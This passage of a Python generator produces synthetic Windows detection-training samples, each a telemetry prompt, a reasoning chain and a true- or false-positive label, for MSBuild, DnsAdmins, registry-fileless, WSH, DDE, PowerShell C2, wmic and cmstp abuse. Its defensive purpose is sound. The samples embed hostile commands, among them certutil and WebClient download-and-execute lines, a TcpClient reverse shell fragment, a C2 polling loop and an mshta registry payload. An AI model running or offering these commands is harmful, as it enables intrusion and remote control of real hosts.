              f"    Image: C:\\Windows\\Microsoft.NET\\Framework\\{fw}\\MSBuild.exe\n"
              f"    ParentImage: {parent}\n"
              f"    CommandLine: MSBuild.exe {proj}\n"
              f"    csproj_from_non_dev_path=YES  (not a solution directory)\n"
              f"  EventID=7 (ImageLoaded)\n"
              f"    Image: MSBuild.exe\n"
              f"    ImageLoaded: Microsoft.Build.Tasks.{fw}.dll\n"
              f"    CodeTaskFactory_invoked=YES  (inline C# compilation)\n"
              f"  EventID=1 (child from MSBuild.exe)\n"
              f"    Image: cmd.exe  ParentImage: MSBuild.exe\n"
              f"    (inline C# task spawning shell via Process.Start)")

    cot = _cot(
        "MSBuild.exe builds software projects in Visual Studio and CI/CD pipelines. "
        "Legitimate invocations: from Visual Studio (devenv.exe), Azure DevOps agent, "
        "or Jenkins -- always with .sln/.csproj files in the solution directory. "
        "They NEVER spawn cmd.exe as a build output.",
        f"MSBuild invoked from {parent} (not devenv/VS agent) with {proj} "
        "(not a solution directory -- user temp/downloads). "
        "CodeTaskFactory loaded = inline C# UsingTask compilation. "
        "cmd.exe child from MSBuild = inline C# called Process.Start() = "
        "arbitrary code execution via trusted developer binary bypass.",
        f"Host {host} ({user}): MSBuild.exe used to bypass application "
        "control by executing inline C# tasks without writing a traditional executable.",
        "MSBuild inline C# task LOLBAS confirmed -- temp .csproj + CodeTaskFactory + shell child.",
        "MITRE T1127.001 (Trusted Developer Utilities: MSBuild). "
        f"Delete {proj}, kill child processes, audit MSBuild invocations.",
    )
    return prompt, cot, "true_positive"

def _msbuild_fp(i):
    prompt = (f"Windows Host Telemetry -- Visual Studio Build.\n"
              f"  EventID=1  Image: MSBuild.exe  ParentImage: devenv.exe\n"
              f"    CommandLine: MSBuild.exe C:\\dev\\MyProject\\MyProject.sln\n"
              f"    project_in_solution_directory=YES\n"
              f"  no_CodeTaskFactory=YES  no_cmd_child=YES\n"
              f"  machine_tag=DEV-WORKSTATION  user_group=Engineering")
    cot = _cot(
        "devenv.exe (Visual Studio) building a solution in the solution directory. "
        "No CodeTaskFactory. No cmd.exe child. Dev workstation.",
        "devenv.exe parent. Solution directory path. No CodeTaskFactory. "
        "No shell child. Dev workstation tag.",
        "Authorized Visual Studio build -- devenv parent, solution path, no inline tasks.",
        "VS build via devenv -- solution directory, no CodeTaskFactory, no child shell.",
        "T1127.001 -- AUTHORIZED VS BUILD. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 8. DnsAdminsDLLAbuse
#    Source: arcanaeum/offsec/study/techniques/ActiveDirectory/
#            active-directory-kerberos-abuse-writeups/from-dnsadmins-to-system.md
#    Chain: DnsAdmins group member → dnscmd <DC> /config /serverlevelplugindll
#           \\<attacker>\share\dnsprivesc.dll → registry sets ServerLevelPluginDll →
#           DNS service restart → dns.exe loads DLL as SYSTEM
#    Evidence: EventID 1 (dnscmd with /config /serverlevelplugindll) +
#              EventID 13 (HKLM\SYSTEM\...\DNS\Parameters\ServerLevelPluginDll set) +
#              EventID 7 (dns.exe loading DLL from UNC path) +
#              EventID 3 (DNS restart → SYSTEM connection to attacker share)
#    Admin FP: Legitimate DNS administrator adding an approved DNS plugin
# ═══════════════════════════════════════════════════════════════════════════════

def _dns_tp(i):
    attacker_ip  = _ip_int() if i % 2 == 0 else _ip_ext()
    dc_name      = f"DC{random.randint(1,5):02d}"
    dll_name     = random.choice(["dnsprivesc.dll","update.dll","plugin.dll","hook.dll"])
    host = _host(); user = _user()

    prompt = (f"Windows Host Telemetry -- DnsAdmins Privilege Escalation (SYSTEM via DNS).\n"
              f"Host: {host}  User: {user}  (member of DnsAdmins group)\n"
              f"  phase_1_set: EventID=1 (Process Create)\n"
              f"    Image: dnscmd.exe\n"
              f"    CommandLine: dnscmd {dc_name} /config /serverlevelplugindll "
              f"\\\\{attacker_ip}\\tools\\{dll_name}\n"
              f"  phase_2_registry: EventID=13 (Registry Set)\n"
              f"    Image: dnscmd.exe\n"
              f"    TargetObject: HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ServerLevelPluginDll\n"
              f"    Details: \\\\{attacker_ip}\\tools\\{dll_name}\n"
              f"  phase_3_load: EventID=7 (ImageLoaded) -- after DNS restart\n"
              f"    Image: dns.exe  ImageLoaded: \\\\{attacker_ip}\\tools\\{dll_name}\n"
              f"    Signed: false  RunningAs=NT AUTHORITY\\SYSTEM\n"
              f"  EventID=3: dns.exe → {attacker_ip}:445 (loading DLL from SMB share)\n"
              f"  SYSTEM_code_execution_via_dns.exe=YES")

    cot = _cot(
        "DNS administrators occasionally load plugins via ServerLevelPluginDll for "
        "custom logging or integration. Legitimate plugins are signed, stored on "
        "internal infrastructure, and approved through change management.",
        f"dnscmd /config /serverlevelplugindll with UNC path to {attacker_ip} "
        "(external IP or attacker-controlled share). Unsigned DLL. "
        "ServerLevelPluginDll pointing to network share = DLL loads as SYSTEM "
        "when DNS service starts. EventID 3 from dns.exe to {attacker_ip}:445 "
        "= dns.exe fetching attacker DLL via SMB. DnsAdmins privilege abuse to "
        "execute arbitrary code as SYSTEM on Domain Controller.",
        f"DC {dc_name}: dns.exe (SYSTEM) loaded unsigned DLL from "
        f"\\\\{attacker_ip}\\tools\\{dll_name}. Attacker has SYSTEM on DC.",
        "DnsAdmins DLL injection confirmed -- ServerLevelPluginDll + unsigned UNC DLL + SYSTEM execution.",
        "MITRE T1547.013 (Boot or Logon Autostart: DLL Injection via dnscmd). "
        f"Remove ServerLevelPluginDll registry key, restart DNS service, "
        f"block {attacker_ip}, audit DnsAdmins group membership.",
    )
    return prompt, cot, "true_positive"

def _dns_fp(i):
    prompt = (f"Windows Host Telemetry -- Authorized DNS Plugin Deployment.\n"
              f"  EventID=1  Image: dnscmd.exe\n"
              f"    CommandLine: dnscmd DC01 /config /serverlevelplugindll "
              f"C:\\Program Files\\DNSFilter\\dnsfilter.dll\n"
              f"    local_path_not_UNC=YES  dll_signed=YES  vendor=DNSFilter\n"
              f"  HKLM...ServerLevelPluginDll=C:\\Program Files\\DNSFilter\\dnsfilter.dll\n"
              f"  change_ticket=CHG-{random.randint(10000,99999)}  cmdb_registered=YES")
    cot = _cot(
        "Authorized DNS filtering plugin deployed to local path. "
        "Signed by vendor. Local path (not UNC). Change ticket.",
        "Local path (not \\\\UNC). Signed DLL. CMDB-registered. Change ticket. "
        "Not an attacker-controlled network share.",
        "Authorized DNS plugin deployment -- local signed DLL, change ticket.",
        "Authorized DNS plugin -- local path, signed, change ticket.",
        "T1547.013 -- AUTHORIZED DNS PLUGIN. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 9. RegistryFilelessLOL
#    Source: arcanaeum/offsec/ttps/6_LOTL/living-off-the-land/README.md
#            (3-stage fileless attack: registry as storage + null-byte Run key)
#    Chain: Store payload DLL as binary blob in HKCU registry →
#           Write mshta Run key with Assembly::Load([Registry]::...) PowerShell →
#           Null-byte prefix on Run key value name (hidden from regedit) →
#           On startup: mshta → powershell → [Reflection.Assembly]::Load(registry blob)
#    Evidence: EventID 13 (large binary data written to HKCU\Software\...) +
#              EventID 13 (HKCU\...\Run with embedded mshta+PS command) +
#              EventID 1 (mshta.exe → powershell loading from registry)
#    Admin FP: Legitimate application storing config data in HKCU registry
# ═══════════════════════════════════════════════════════════════════════════════

def _regfill_tp(i):
    regkey   = random.choice([
        "HKCU\\Software\\Microsoft\\Internet Explorer",
        "HKCU\\Software\\Classes\\CLSID\\{...}",
        "HKCU\\Software\\Microsoft\\Office\\Addins",
    ])
    blob_size = random.randint(50000, 500000)
    host = _host(); user = _user()

    regkey_subpath = regkey.split("HKCU\\", 1)[-1]
    prompt = (f"Windows Host Telemetry -- Registry-as-Storage Fileless LOLBAS (3-stage chain).\n"
              f"Host: {host}  User: {user}\n"
              f"  phase_1_store: EventID=13 (Registry Set)\n"
              f"    Image: powershell.exe  TargetObject: {regkey}\n"
              f"    data_type=REG_BINARY  data_size={blob_size}_bytes  (DLL stored in registry)\n"
              f"    assembly_dll_serialized_as_binary=YES\n"
              f"  phase_2_persist: EventID=13 (Registry Set)\n"
              f"    TargetObject: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n"
              f"    Details: mshta.exe \"javascript:close(new ActiveXObject('WScript.Shell')"
              f".run('powershell \"[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::"
              f"CurrentUser.OpenSubKey(\\\"{regkey_subpath}\\\").GetValue($null))"
              f".EntryPoint.Invoke(0,$null)\"',0))\"\n"
              f"    run_key_value_name_starts_with_null_byte=YES  (hidden from regedit)\n"
              f"  phase_3_exec: EventID=1 (startup)\n"
              f"    Image: mshta.exe → powershell.exe (Assembly::Load from registry blob)\n"
              f"    no_disk_artifact=YES  (payload never touches filesystem)")

    cot = _cot(
        "Applications legitimately store configuration in HKCU registry. However, "
        "storing 50-500KB binary blobs (DLL size) in IE or CLSID registry keys "
        "is not a configuration pattern. Run keys with null-byte prefixes are "
        "explicitly designed to evade regedit inspection.",
        f"REG_BINARY blob of {blob_size} bytes written to {regkey} = serialized DLL "
        "stored in registry as payload storage (no disk artifact). "
        "HKCU\\...\\Run entry with null-byte prefix = persistence hidden from "
        "standard tools (regedit shows empty name; registry editor crashes). "
        "mshta+PS+Assembly::Load chain = 3-stage fileless execution on every login. "
        "No PE file ever written to disk = AV evasion confirmed.",
        f"Host {host} ({user}): 3-stage fileless persistence installed. "
        "DLL stored in registry, executed via mshta→PS→Assembly::Load on every login. "
        "No disk artifact for AV to scan.",
        "Registry-as-storage fileless LOLBAS confirmed -- DLL blob + null-byte Run key + Assembly::Load chain.",
        "MITRE T1620 (Reflective Code Loading) + T1112 (Modify Registry) + T1547.001. "
        f"Delete {regkey} binary blob, delete Run key null-byte entry, "
        "scan for other large REG_BINARY blobs in HKCU.",
    )
    return prompt, cot, "true_positive"

def _regfill_fp(i):
    prompt = (f"Windows Host Telemetry -- Application Config in Registry.\n"
              f"  EventID=13  Image: chrome.exe\n"
              f"    TargetObject: HKCU\\Software\\Google\\Chrome\\Extensions\\...\n"
              f"    data_type=REG_SZ  data_size=512_bytes  (small config string)\n"
              f"  no_REG_BINARY_blob=YES  no_null_byte_run_key=YES\n"
              f"  code_signed=YES  vendor=Google")
    cot = _cot(
        "Chrome storing extension configuration as small REG_SZ strings. "
        "No binary blob. No null-byte Run key. Signed Google binary.",
        "REG_SZ (not REG_BINARY). 512 bytes (not 50-500KB). "
        "No Run key modification. Signed by Google.",
        "Authorized Chrome extension config in registry -- small string, no blob, signed.",
        "Chrome extension config -- REG_SZ, small, signed, no Run key.",
        "T1112 -- AUTHORIZED APP CONFIG. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 10. WSHScriptletProxy
#     Source: arcanaeum/offsec/ttps/6_LOTL/LOTL-example/call_reg.js
#             arcanaeum/offsec/study/techniques/pwsh-scripts/ (various scripts)
#     Chain: wscript.exe/cscript.exe executing malicious .vbs or .js →
#            ActiveXObject("WScript.Shell").Run() → cmd/powershell child →
#            OR: registry read via Shell.RegRead() → execute stored payload
#            OR: environment variable read → execute LOTL_VAR content
#     Evidence: EventID 1 (wscript/cscript spawning cmd/powershell) +
#               EventID 10 (Registry read from script host) +
#               EventID 1 (child from script host)
#     Admin FP: Legitimate admin VBScript (logon scripts, IT automation)
# ═══════════════════════════════════════════════════════════════════════════════

def _wsh_tp(i):
    script_ext = random.choice([".vbs",".js",".wsf"])
    script_paths = [
        f"C:\\Users\\{_user()}\\AppData\\Local\\Temp\\{''.join(random.choices('abcdef',k=6))}{script_ext}",
        f"C:\\Users\\{_user()}\\Downloads\\update{script_ext}",
        f"C:\\ProgramData\\{''.join(random.choices('abcdef',k=4))}{script_ext}",
    ]
    script_path = script_paths[i % len(script_paths)]
    host = _host(); user = _user()
    parent = random.choice(["WINWORD.EXE","EXCEL.EXE","outlook.exe","cmd.exe","explorer.exe"])
    child = random.choice(["cmd.exe","powershell.exe"])

    scripts = [
        (f"wscript.exe {script_path}", "VBScript/JScript executing shell via WScript.Shell ActiveXObject"),
        (f"cscript.exe //nologo //B {script_path}", "cscript silent mode hiding execution window"),
        (f"wscript.exe {script_path}", "JScript reading HKCU registry → executing stored payload"),
    ]
    cmdline, desc = scripts[i % len(scripts)]

    prompt = (f"Windows Host Telemetry -- WSH Script Proxy LOLBAS Execution.\n"
              f"Host: {host}  User: {user}\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: {'wscript.exe' if 'wscript' in cmdline else 'cscript.exe'}\n"
              f"    ParentImage: {parent}\n"
              f"    CommandLine: {cmdline}\n"
              f"    script_from_temp_or_downloads=YES  ({desc})\n"
              f"  EventID=10 (Registry Access)\n"
              f"    Image: {'wscript.exe' if 'wscript' in cmdline else 'cscript.exe'}\n"
              f"    TargetObject: HKCU\\Software\\LOTL\\  (reading stored payload)\n"
              f"  EventID=1 (child from script host)\n"
              f"    Image: {child}  ParentImage: {'wscript.exe' if 'wscript' in cmdline else 'cscript.exe'}\n"
              f"    ({desc})")

    cot = _cot(
        "Legitimate VBScript/JScript is used for Windows logon scripts, legacy "
        "admin automation, and application setup helpers. Legitimate scripts are "
        "stored in NETLOGON, SYSVOL, or IT tool directories -- never %TEMP% or "
        "Downloads -- and are signed with corporate PKI.",
        f"Script in {script_path.split(chr(92))[2]} (user-writable, not IT infrastructure). "
        f"Parent {parent} has no legitimate reason to spawn WSH to execute scripts. "
        "Registry read of HKCU\\Software\\LOTL = reading stored payload/config (not normal). "
        f"{child} child from WSH = shell execution via WScript.Shell.Run(). "
        "Unsigned script from temp path spawned by Office = dropper delivery chain.",
        f"Host {host} ({user}): WSH script proxy used to execute payload via "
        f"WScript.Shell.Run() → {child}. Script delivered via {parent}.",
        f"WSH script proxy execution confirmed -- {desc}.",
        "MITRE T1059.005 (Command and Scripting Interpreter: Visual Basic). "
        f"Delete {script_path}, kill {child}, trace {parent} for initial access.",
    )
    return prompt, cot, "true_positive"

def _wsh_fp(i):
    script = random.choice(["logon.vbs","map_drives.vbs","printer_install.wsf"])
    prompt = (f"Windows Host Telemetry -- Authorized Logon Script.\n"
              f"  EventID=1  Image: wscript.exe  ParentImage: userinit.exe\n"
              f"    CommandLine: wscript.exe \\\\domain\\NETLOGON\\{script}\n"
              f"    script_from_NETLOGON=YES  code_signed=YES  vendor=corp-pki-ca\n"
              f"  no_HKCU_LOTL_registry_read=YES  no_temp_path=YES\n"
              f"  gpo_deployed=YES")
    cot = _cot(
        f"GPO-deployed logon script from NETLOGON share. Signed by corp PKI. "
        "userinit.exe parent (expected for logon scripts). No temp path.",
        "userinit.exe parent. NETLOGON path. Corporate PKI signature. GPO-deployed. "
        "No HKCU\\LOTL registry reads.",
        f"Authorized GPO logon script {script} -- NETLOGON, signed, userinit parent.",
        f"GPO logon script from NETLOGON -- signed, userinit parent, no temp path.",
        "T1059.005 -- AUTHORIZED LOGON SCRIPT. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 11. OfficeDDEExecution
#     Source: arcanaeum/offsec/study/techniques/Macro/Macro-Less-Cheatsheet.md
#             Various-Macro-Based-RCEs.md
#     Chain: Office document with DDE field / DDEAUTO →
#            Word/Excel parses DDE link → prompts user (or auto-executes) →
#            launches external application (cmd.exe, powershell.exe) →
#            macro-free code execution (bypasses VBA macro controls)
#     Evidence: EventID 1 (WINWORD/EXCEL spawning cmd/powershell WITHOUT macro parent) +
#               EventID 22 (DNS query from Office for linked server) +
#               EventID 11 (temp file creation by Office for DDE data)
#     Admin FP: Legitimate DDE data links between Office documents (e.g., Excel → Excel)
# ═══════════════════════════════════════════════════════════════════════════════

def _dde_tp(i):
    office_procs = ["WINWORD.EXE","EXCEL.EXE","POWERPNT.EXE"]
    office = office_procs[i % len(office_procs)]
    attacker_domain = f"{random.choice(['data','link','docs'])}-{random.randint(100,999)}.{random.choice(['net','com'])}"
    payload_cmd = random.choice([
        "cmd /c powershell -enc %s" % _b64()[:30],
        "cmd.exe /c certutil -urlcache -f http://%s/p.exe %%TEMP%%\\p.exe" % _ip_ext(),
        "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://%s/')" % _ip_ext(),
    ])
    host = _host(); user = _user()

    prompt = (f"Windows Host Telemetry -- Office DDE Macro-less Code Execution.\n"
              f"Host: {host}  User: {user}\n"
              f"  trigger: {office} opened document with embedded DDE/DDEAUTO field\n"
              f"  EventID=22 (DNS Query)\n"
              f"    Image: {office}  QueryName: {attacker_domain}\n"
              f"    dde_server_resolution=YES  domain_age_days={random.randint(1,30)}\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: cmd.exe  ParentImage: {office}\n"
              f"    CommandLine: {payload_cmd[:80]}...\n"
              f"    macro_enabled=NO  (DDE execution -- no VBA macro required)\n"
              f"    no_vba_macro_warning=YES  (bypasses macro security policy)\n"
              f"  EventID=1 (grandchild)\n"
              f"    Image: powershell.exe  ParentImage: cmd.exe  ParentGrandParent: {office}")

    cot = _cot(
        f"Excel and Word use DDE for legitimate data links between documents "
        "(e.g., Excel spreadsheet linked to another Excel file for live data). "
        "The discriminator is: does the DDE link resolve to a Microsoft application "
        "loading structured data, or to cmd.exe executing a payload?",
        f"{office} spawning cmd.exe is the DDEAUTO execution signal. No VBA macro was "
        "required -- DDE bypasses macro security policies entirely. DNS query to "
        f"{attacker_domain} (domain age {random.randint(1,30)}d) = DDE server resolution "
        "to attacker infrastructure. cmd.exe CommandLine contains encoded payload = "
        "DDE field weaponized as dropper chain. This is macro-less Office RCE.",
        f"Host {host} ({user}): Office DDE macro-less code execution. "
        f"cmd.exe spawned by {office} without macro. Payload delivered.",
        f"Office DDE code execution confirmed -- {office} spawning cmd.exe without macro.",
        "MITRE T1559.002 (Inter-Process Communication: Dynamic Data Exchange). "
        f"Disable DDE in Office GPO, kill cmd/ps child, block {attacker_domain}.",
    )
    return prompt, cot, "true_positive"

def _dde_fp(i):
    prompt = (f"Windows Host Telemetry -- Legitimate Office DDE Data Link.\n"
              f"  EventID=1  Image: EXCEL.EXE  (not spawning cmd.exe)\n"
              f"    DDE_link_target=\\\\fileserver\\shares\\data.xlsx\n"
              f"    dde_resolves_to_excel_not_cmd=YES\n"
              f"    internal_server=YES  no_external_dns=YES\n"
              f"  no_cmd_child=YES  no_powershell_child=YES")
    cot = _cot(
        "Excel DDE link to internal file server for live data refresh. "
        "DDE resolves to another Excel file, not cmd.exe.",
        "DDE link resolves to Excel (not cmd/powershell). Internal server. "
        "No external DNS. No shell child spawned.",
        "Authorized Excel-to-Excel DDE data link -- no shell spawn.",
        "Excel DDE to internal data file -- no cmd child, internal server.",
        "T1559.002 -- AUTHORIZED DDE DATA LINK. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 12. PowerShellNetworkC2
#     Source: arcanaeum/offsec/ttps/6_LOTL/LOTL-example/reverse_shell.ps1
#             arcanaeum/offsec/study/techniques/pwsh-scripts/Send-CommandToAgent.ps1
#     Chain: PowerShell creating System.Net.Sockets.TcpClient to attacker IP →
#            StreamReader/StreamWriter for interactive shell over raw TCP →
#            OR: Invoke-WebRequest / WebClient.DownloadString for HTTP C2
#            Living off the land: no custom binary needed -- PS is built-in
#     Evidence: EventID 3 (powershell.exe → external IP on non-standard port) +
#               EventID 1 (powershell with System.Net.Sockets or WebClient usage) +
#               EventID 22 (powershell DNS resolution for C2 domain)
#     Admin FP: PowerShell remote management via WinRM (port 5985/5986)
# ═══════════════════════════════════════════════════════════════════════════════

def _psnc2_tp(i):
    c2_ip    = _ip_ext()
    c2_port  = random.choice([4444, 1337, 8888, 9001, 443, 80])
    host = _host(); user = _user()
    parent = random.choice(["WINWORD.EXE","cmd.exe","wscript.exe","mshta.exe"])

    variants = [
        (f"powershell $socket = new-object System.Net.Sockets.TcpClient('{c2_ip}',{c2_port}); "
         f"$stream = $socket.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; "
         f"while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{...}}",
         "TcpClient raw reverse shell"),
        (f"powershell IEX (New-Object Net.WebClient).DownloadString('http://{c2_ip}/')",
         "WebClient DownloadString IEX C2 channel"),
        (f"powershell while(1){{$c=Invoke-WebRequest -Uri http://{c2_ip}/cmd -UseBasicParsing;"
         f"IEX $c.Content; Start-Sleep 30}}",
         "HTTP polling C2 loop"),
    ]
    cmdline, desc = variants[i % len(variants)]
    cv = round(random.uniform(0.01, 0.08), 4)

    prompt = (f"Windows Host Telemetry -- PowerShell LOLBAS Network C2.\n"
              f"Host: {host}  User: {user}\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: powershell.exe  ParentImage: {parent}\n"
              f"    CommandLine: {cmdline[:100]}...\n"
              f"    ({desc})\n"
              f"  EventID=3 (Network Connection)\n"
              f"    Image: powershell.exe  DestinationIp={c2_ip}  DestinationPort={c2_port}\n"
              f"    Protocol=TCP  beacon_interval_s={random.randint(10,60)}\n"
              f"    variance_inter_arrival={cv:.4f}  (machine-generated beacon)\n"
              f"    session_count={random.randint(5,50)}  (repeated connections)\n"
              f"  no_custom_binary=YES  (pure PowerShell -- no dropped executable)")

    cot = _cot(
        "PowerShell is used legitimately for WinRM remote management, Windows Update "
        "cmdlets, and module installation. Legitimate PS network connections use "
        "WinRM (5985/5986), the PSGallery API, or known Microsoft endpoints.",
        f"powershell.exe connecting to {c2_ip}:{c2_port} from {parent} parent. "
        f"Port {c2_port} {'is non-standard (not WinRM/HTTPS)' if c2_port not in (443,80,5985,5986) else 'over raw TCP (not HTTPS API)'}. "
        f"CV={cv:.4f} = machine-generated beacon timing. {desc}. "
        "No custom binary required -- attacker using built-in PowerShell for full C2 "
        "channel. System.Net.Sockets.TcpClient = raw TCP reverse shell.",
        f"Host {host} ({user}): PowerShell acting as C2 agent. "
        f"Interactive shell or polling C2 to {c2_ip}:{c2_port}.",
        f"PowerShell LOLBAS C2 confirmed -- {desc}.",
        "MITRE T1059.001 (Command and Scripting Interpreter: PowerShell) + T1071.001. "
        f"Kill powershell.exe process, block {c2_ip}, check for secondary persistence.",
    )
    return prompt, cot, "true_positive"

def _psnc2_fp(i):
    prompt = (f"Windows Host Telemetry -- Authorized PowerShell Remote Management.\n"
              f"  EventID=1  Image: powershell.exe  ParentImage: svchost.exe -k DcomLaunch\n"
              f"    CommandLine: powershell.exe -NonInteractive -NoProfile -EncodedCommand ...\n"
              f"    triggered_by_WinRM=YES\n"
              f"  EventID=3  DestinationPort=5985  (WinRM standard)\n"
              f"    source_ip_in_corporate_range=YES\n"
              f"  gpo_deployed=YES  admin_account=svc-sysops")
    cot = _cot(
        "WinRM-triggered PowerShell from svchost DComLaunch to port 5985 "
        "from corporate IP range. Service account. GPO-deployed.",
        "WinRM trigger (port 5985). Corporate IP range. svc-sysops service account. "
        "GPO-deployed. svchost parent. No raw TcpClient.",
        "Authorized WinRM PowerShell remoting -- WinRM port, corp IP, service account.",
        "WinRM PS remoting -- port 5985, corp IP, service account, GPO.",
        "T1059.001 -- AUTHORIZED WINRM REMOTING. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 13. WmicProxyExecution
#     Source: T1047 -- wmic process call create used as execution proxy to avoid
#             spawning cmd.exe directly (bypasses parent-child detection)
#     Chain: wmic process call create "powershell.exe -enc <payload>"
#            OR: wmic /node:<IP> process call create (remote WMI execution)
#     Evidence: EventID 1 (wmic with "process call create") +
#               EventID 1 (child spawned by WmiPrvSE.exe, not wmic.exe directly) +
#               EventID 3 (wmic outbound 135/5985 for remote variant)
#     Admin FP: wmic querying system info (wmic computersystem get model)
# ═══════════════════════════════════════════════════════════════════════════════

def _wmic_tp(i):
    host = _host(); user = _user()
    child = random.choice(["powershell.exe","cmd.exe","cscript.exe"])
    parent = random.choice(["cmd.exe","powershell.exe","WINWORD.EXE","wscript.exe"])

    variants = [
        (f"wmic process call create \"powershell.exe -w hidden -enc {_b64()[:30]}\"",
         "local WMI process creation to spawn hidden PowerShell (bypasses direct PS parent)"),
        (f"wmic /node:{_ip_int()} /user:administrator /password:P@ssw0rd process call create \"cmd /c whoami > C:\\temp\\out.txt\"",
         "remote WMI process creation with plaintext creds in commandline"),
        (f"wmic process call create \"cmd /c certutil -urlcache -f http://{_ip_ext()}/p.exe %TEMP%\\p.exe && %TEMP%\\p.exe\"",
         "WMI chained download-and-execute via cmd"),
    ]
    cmdline, desc = variants[i % len(variants)]
    wmipid = _pid()

    prompt = (f"Windows Host Telemetry -- wmic.exe WMI Proxy Execution.\n"
              f"Host: {host}  User: {user}\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: wmic.exe  ParentImage: {parent}\n"
              f"    CommandLine: {cmdline[:100]}...\n"
              f"    ({desc})\n"
              f"  EventID=1 (WMI-spawned child -- NOT direct child of wmic.exe)\n"
              f"    Image: {child}  ParentImage: WmiPrvSE.exe  PID={wmipid}\n"
              f"    (WmiPrvSE.exe is the WMI provider host -- child appears under it)\n"
              f"    wmiprvse_parent_breaks_direct_process_lineage=YES")

    cot = _cot(
        "wmic.exe is a Windows Management Instrumentation command-line tool used by "
        "IT for hardware inventory (wmic computersystem get model), service management, "
        "and performance queries. Legitimate use has no 'process call create' -- that is "
        "exclusively an execution method.",
        f"'process call create' in wmic commandline = direct process spawning via WMI. "
        "The spawned process appears as child of WmiPrvSE.exe (WMI provider host), not "
        "wmic.exe -- this is a known evasion of parent-child process tree detections. "
        f"{desc}. No legitimate admin use case involves spawning {child} via WMI from "
        f"an interactive session from {parent}.",
        f"Host {host} ({user}): wmic.exe used as execution proxy -- WmiPrvSE.exe child "
        f"{child} breaks expected process lineage. WMI process creation confirmed.",
        f"wmic.exe proxy execution confirmed -- WmiPrvSE.exe spawning {child}.",
        "MITRE T1047 (Windows Management Instrumentation). "
        f"Kill {child} (WmiPrvSE child), investigate {parent} for initial delivery.",
    )
    return prompt, cot, "true_positive"

def _wmic_fp(i):
    prompt = (f"Windows Host Telemetry -- wmic System Inventory Query.\n"
              f"  EventID=1  Image: wmic.exe  ParentImage: cmd.exe\n"
              f"    CommandLine: wmic computersystem get model,manufacturer,serialnumber\n"
              f"    no_process_call_create=YES  no_network_connection=YES\n"
              f"  no_WmiPrvSE_child=YES  context=IT_asset_inventory  user=svc-cmdb")
    cot = _cot(
        "wmic querying hardware inventory -- no process call create, no network, service account.",
        "No 'process call create'. No network. No WmiPrvSE child. Service account context.",
        "Authorized wmic inventory query -- read-only, no execution.",
        "wmic inventory query -- no execution, service account.",
        "T1047 -- AUTHORIZED INVENTORY QUERY. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 14. CmstpBypass
#     Source: T1218.003 -- cmstp.exe Connection Manager Profile Installer
#     Chain: cmstp.exe /au /ns malicious.inf → RunPreSetupCommands in INF file
#            executes arbitrary command (DLL or cmd) before profile installation
#            UAC bypass variant: inf with ShellExecute for elevated COM object
#     Evidence: EventID 1 (cmstp.exe from unusual parent with .inf from temp) +
#               EventID 1 (child from cmstp.exe -- cmd/rundll32) +
#               EventID 7 (DLL loaded by cmstp.exe)
#     Admin FP: legitimate VPN profile deployment via cmstp
# ═══════════════════════════════════════════════════════════════════════════════

def _cmstp_tp(i):
    host = _host(); user = _user()
    inf_path = random.choice([
        f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{''.join(random.choices('abcdef',k=6))}.inf",
        f"C:\\Users\\{user}\\Downloads\\update.inf",
        f"C:\\ProgramData\\{''.join(random.choices('abcdef',k=4))}.inf",
    ])
    parent = random.choice(["powershell.exe","cmd.exe","wscript.exe","WINWORD.EXE"])
    child  = random.choice(["cmd.exe","rundll32.exe","powershell.exe"])
    child_pid = _pid()

    variants = [
        (f"cmstp.exe /au /ns {inf_path}", "AppLocker bypass via CMSTP profile install"),
        (f"cmstp.exe /au {inf_path}", "UAC bypass via CMSTP elevated COM activation"),
    ]
    cmdline, desc = variants[i % len(variants)]

    prompt = (f"Windows Host Telemetry -- cmstp.exe LOLBAS AppLocker/UAC Bypass.\n"
              f"Host: {host}  User: {user}\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: cmstp.exe  ParentImage: {parent}\n"
              f"    CommandLine: {cmdline}\n"
              f"    ({desc})\n"
              f"    inf_from_temp_or_downloads=YES  (not a VPN profile directory)\n"
              f"  EventID=7 (ImageLoaded) [if DLL variant]\n"
              f"    Image: cmstp.exe  Signed=false\n"
              f"  EventID=1 (child from cmstp.exe)\n"
              f"    Image: {child}  PID={child_pid}  ParentImage: cmstp.exe\n"
              f"    IntegrityLevel=High  (UAC bypass variant elevates to High IL)")

    cot = _cot(
        "cmstp.exe installs VPN connection manager profiles. IT uses it to deploy "
        "corporate VPN configurations. Legitimate .inf files come from the IT software "
        "distribution share, are signed, and never spawn cmd.exe/rundll32.exe as children.",
        f"cmstp.exe invoked from {parent} (not IT deployment tool) with .inf from "
        f"{inf_path.split(chr(92))[2]} (user-writable path, not IT share). "
        f"{child} child from cmstp.exe = RunPreSetupCommands in INF executed arbitrary command. "
        f"{desc}. High IL child = UAC bypass succeeded.",
        f"Host {host} ({user}): cmstp.exe executed INF RunPreSetupCommands → "
        f"{child} child (High IL). AppLocker and UAC bypassed.",
        f"cmstp.exe LOLBAS bypass confirmed -- {desc}.",
        "MITRE T1218.003 (System Binary Proxy Execution: CMSTP). "
        f"Kill {child} PID={child_pid}, delete {inf_path}, investigate {parent}.",
    )
    return prompt, cot, "true_positive"

def _cmstp_fp(i):
